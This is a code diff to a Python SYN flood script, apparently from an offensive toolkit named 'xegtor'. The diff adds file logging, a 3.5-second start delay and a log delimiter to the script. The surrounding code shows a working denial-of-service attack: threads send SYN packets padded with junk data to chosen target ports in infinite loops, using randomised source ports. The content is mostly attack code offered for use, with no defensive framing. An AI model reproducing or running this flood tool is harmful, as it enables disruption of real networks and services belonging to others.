@@ -9,6 +9,11 @@ from scapy.layers.inet import *
 from argparse import ArgumentParser
 from random import randint
 from time import sleep
+from modules.logger import Logger
+
+log_file_path = 'logs/xegtor.log'
+logger = Logger(log_file=log_file_path ,filemode='a')
+logger.check_logs()
 
 class SynFlood:
     def __init__(self,target,ports):
@@ -16,13 +21,20 @@ class SynFlood:
         self.ports = ports
 
     def start(self):
+        logger.add_log_delimiter()
+        logger.add_log_path()
+        logger.add_script_name('syn_flood.py')
+        logger.add_time()
+
         self.check_ports()
         self.get_random_ports()
         try:
             self.run_attack()
         except KeyboardInterrupt :
             print()
-            print('Attack Stopped!')
+            attack_stop_msg = 'Attack Stopped!'
+            print(attack_stop_msg)
+            logger.log(attack_stop_msg)
             exit() # exit when ctrl+c is pressed
 
     def check_ports(self):
@@ -35,7 +47,9 @@ class SynFlood:
                     int(p)
                 except:
                     print()
-                    print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
+                    error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
+                    print(error_msg)
+                    logger.log(error_msg)
                     exit()
                 else:
                     if (num < 1):
@@ -44,24 +58,32 @@ class SynFlood:
                     self.ports_in_attack.append(int(p))
                     print(p + ' ',end='')
 
+            logger.log('ports : ' + str(self.ports_in_attack))
+
         elif '-' in self.ports : # for ports range
             try :
                 port_start = int(self.ports.split('-')[0])
                 port_end = int(self.ports.split('-')[1])
             except :
                 print()
-                print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
+                error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
+                print(error_msg)
+                logger.log(error_msg)
                 exit()
             else:
                 self.ports_in_attack = list(range(port_start,port_end + 1))
-                print('ports : ' + str(port_start) + ' to ' + str(port_end))
+                ports_range_msg = 'ports : ' + str(port_start) + ' to ' + str(port_end)
+                print(ports_range_msg)
+                logger.log(ports_range_msg)
 
         else: # for single port
             try :
                 int(self.ports)
             except ValueError:
                 print()
-                print('error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]')
+                error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
+                print(error_msg)
+                logger.log(error_msg)
                 exit()
             else:
                 self.ports_in_attack.append(int(self.ports))
@@ -76,8 +98,11 @@ class SynFlood:
             self.random_ports_list.append(port)
 
     def run_attack(self):
-        print('3.5 seconds to start attack ---> CTRL+C to stop ....')
-        # sleep(3.5)
+        start_attack_timer_msg = '3.5 seconds to start attack ---> CTRL+C to stop ...'
+        print(start_attack_timer_msg)
+        logger.log(start_attack_timer_msg)
+
+        sleep(3.5)
         for random_p in self.random_ports_list:
             for p_in_attack in self.ports_in_attack:
                 t= Thread(target=self.send_packet,args=(random_p,p_in_attack,))
@@ -89,7 +114,12 @@ class SynFlood:
         tcp = TCP(flags='S',sport=int(random_port),dport=int(port_in_attack))
         trash_data = Raw(b'd'*1024) # add some trash data to flood
         packet = ip / tcp / trash_data
+        logger.log('.................')
         send(packet,verbose=1,loop=1)
+
+    def __del__(self):
+        # when attack is finished add a log delimiter into log file
+        logger.add_log_delimiter()
 
 def run_from_gui(argument_values):
     syn_flood = SynFlood(target=argument_values['target'] ,ports=argument_values['port'])
